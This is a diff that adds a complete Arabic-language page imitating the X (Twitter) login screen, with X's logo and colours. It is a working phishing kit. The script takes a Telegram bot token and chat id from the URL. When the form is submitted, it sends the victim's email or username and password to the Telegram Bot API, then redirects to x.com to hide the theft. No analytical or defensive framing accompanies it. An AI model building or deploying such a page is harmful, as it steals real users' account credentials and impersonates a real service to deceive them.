@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>X – Login</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:#15202b;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#192734;border-radius:16px;padding:32px;width:380px;text-align:center;color:#fff}svg{width:44px;fill:#1d9bf0;margin-bottom:20px}h2{font-size:24px;margin-bottom:20px}input{width:100%;padding:14px;margin:6px 0;background:#15202b;border:1px solid #38444d;border-radius:4px;color:#fff;font-size:16px;outline-color:#1d9bf0}.btn{width:100%;background:#1d9bf0;color:#fff;border:none;padding:14px;border-radius:30px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:14px}a{color:#1d9bf0;font-size:14px;display:block;margin-top:12px;text-decoration:none}</style></head>
+<body><div class="card">
+<svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+<h2>تسجيل الدخول إلى X</h2>
+<input type="text" id="email" placeholder="البريد الإلكتروني أو اسم المستخدم">
+<input type="password" id="pass" placeholder="كلمة المرور">
+<button class="btn" onclick="send()">تسجيل الدخول</button>
+<a href="#">نسيت كلمة المرور؟</a>
+</div>
+<script>
+const p=new URLSearchParams(location.search),T=p.get('token'),C=p.get('chat');
+function send(){const e=document.getElementById('email').value,pa=document.getElementById('pass').value;
+if(!e||!pa)return alert('املأ جميع الحقول');
+fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent('🐦 تويتر/X\n👤 '+e+'\n🔑 '+pa)}`).finally(()=>{location.href='https://x.com'})}
+</script></body></html>
